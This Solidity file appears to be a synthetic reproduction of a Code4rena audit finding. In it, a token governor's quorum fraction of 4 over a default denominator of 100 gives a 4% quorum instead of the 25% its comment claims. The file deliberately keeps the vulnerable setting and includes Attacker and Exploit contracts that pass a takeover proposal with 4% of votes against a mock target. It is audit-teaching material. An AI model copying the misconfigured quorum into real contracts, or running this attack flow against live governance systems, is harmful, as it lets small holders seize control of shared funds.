// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  IQ AI — [H-01] Adversary can win proposals with voting power as low as 4%
    (Code4rena 2025-01-iq-ai; #50064)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: TokenGovernor constructs GovernorVotesQuorumFraction(4) with a
    comment claiming "quorum is 25% (1/4th) of supply". OZ quorumDenominator()
    defaults to 100, so quorum is 4% — not 25%. An attacker with only 4% of
    voting power meets quorum and can pass/execute proposals alone.
    Vulnerable constructor numerator preserved @>. */

contract VotesToken {
    string public name = "AGENT";
    string public symbol = "AGENT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => address) public delegates;
    mapping(address => uint256) public votes;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _move(msg.sender, to, amt);
        return true;
    }

    function delegate(address to) external {
        address prev = delegates[msg.sender];
        uint256 bal = balanceOf[msg.sender];
        if (prev != address(0)) votes[prev] -= bal;
        delegates[msg.sender] = to;
        if (to != address(0)) votes[to] += bal;
    }

    function _move(address from, address to, uint256 amt) internal {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        address df = delegates[from];
        address dt = delegates[to];
        if (df != address(0)) votes[df] -= amt;
        if (dt != address(0)) votes[dt] += amt;
    }

    function getVotes(address a) external view returns (uint256) {
        return votes[a];
    }

    function getPastTotalSupply(uint256) external view returns (uint256) {
        return totalSupply;
    }
}

/// @dev Agent / LP-holder surface that a malicious proposal can take over.
contract VictimAgent {
    bool public taken;

    function takeover() external {
        taken = true;
    }
}

/// @dev Minimal Governor with OZ-style quorum fraction (denominator 100).
contract TokenGovernor {
    VotesToken public token;
    uint256 public quorumNumeratorValue;
    uint256 public proposalCount;
    VictimAgent public agent;

    struct Proposal {
        address proposer;
        address target;
        uint256 value;
        bytes data;
        uint256 forVotes;
        bool executed;
    }

    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bool)) public hasVoted;

    constructor(VotesToken _token, VictimAgent _agent) {
        token = _token;
        agent = _agent;
        // GovernorVotesQuorumFraction(4) // comment claimed: quorum is 25% (1/4th) of supply
        // OZ denominator defaults to 100, so this is 4% — not 25%.
        quorumNumeratorValue = 4;
        // FIX: quorumNumeratorValue = 25;
    }

    function quorumDenominator() public pure returns (uint256) {
        return 100;
    }

    function quorum(uint256 /*timepoint*/) public view returns (uint256) {
        // @> VULN: numerator 4 / denominator 100 ⇒ 4% quorum (intended 25% per comment)
        return (token.getPastTotalSupply(0) * quorumNumeratorValue) / quorumDenominator();
    }

    function propose(address target, uint256 value, bytes calldata data) external returns (uint256 id) {
        id = ++proposalCount;
        proposals[id] =
            Proposal({proposer: msg.sender, target: target, value: value, data: data, forVotes: 0, executed: false});
    }

    function castVote(uint256 id, uint8 support) external {
        require(support == 1, "only for");
        require(!hasVoted[id][msg.sender], "voted");
        hasVoted[id][msg.sender] = true;
        proposals[id].forVotes += token.getVotes(msg.sender);
    }

    function execute(uint256 id) external {
        Proposal storage p = proposals[id];
        require(!p.executed, "done");
        require(p.forVotes >= quorum(0), "quorum");
        p.executed = true;
        (bool ok,) = p.target.call{value: p.value}(p.data);
        require(ok, "call");
    }
}

contract Attacker {
    VotesToken public token;
    TokenGovernor public governor;

    function init(VotesToken t, TokenGovernor g) external {
        token = t;
        governor = g;
    }

    function selfDelegate() external {
        token.delegate(address(this));
    }

    function proposeTakeover(address agent) external returns (uint256) {
        bytes memory data = abi.encodeWithSelector(VictimAgent.takeover.selector);
        return governor.propose(agent, 0, data);
    }

    function voteAndExecute(uint256 id) external {
        governor.castVote(id, 1);
        governor.execute(id);
    }
}

contract Exploit {
    VotesToken public token; // CREATE nonce 1
    VictimAgent public agent; // CREATE nonce 2
    TokenGovernor public governor; // CREATE nonce 3 — vulnerable
    Attacker public attacker; // CREATE nonce 4

    uint256 public constant SUPPLY = 100_000_000 ether; // 100M as in finding logs
    uint256 public proposalId;
    uint256 public quorumAtVote;
    uint256 public attackerVotes;

    constructor() {
        token = new VotesToken();
        agent = new VictimAgent();
        governor = new TokenGovernor(token, agent);
        attacker = new Attacker();
        attacker.init(token, governor);

        // Full supply to Exploit (whale). Transfer 4% to attacker; leave 96% undelegated.
        token.mint(address(this), SUPPLY);
        uint256 fourPct = (SUPPLY * 4) / 100;
        token.transfer(address(attacker), fourPct);
    }

    function run() external {
        // Attacker self-delegates → 4% voting power.
        attacker.selfDelegate();
        attackerVotes = token.getVotes(address(attacker));
        quorumAtVote = governor.quorum(0);

        require(quorumAtVote == (SUPPLY * 4) / 100, "quorum is 4%");
        require(attackerVotes == quorumAtVote, "attacker has exactly quorum");
        // Intended 25% would be SUPPLY/4 — attacker would FAIL that check:
        require(attackerVotes < (SUPPLY * 25) / 100, "below intended 25%");

        // Malicious proposal targeting the Agent (LP / ownership surface).
        proposalId = attacker.proposeTakeover(address(agent));

        // Cast vote + execute with only 4% power — succeeds because quorum is 4%.
        attacker.voteAndExecute(proposalId);

        require(agent.taken(), "proposal executed agent takeover");
        // Harm: 4% voting power alone meets quorum and executes a malicious proposal.
    }
}
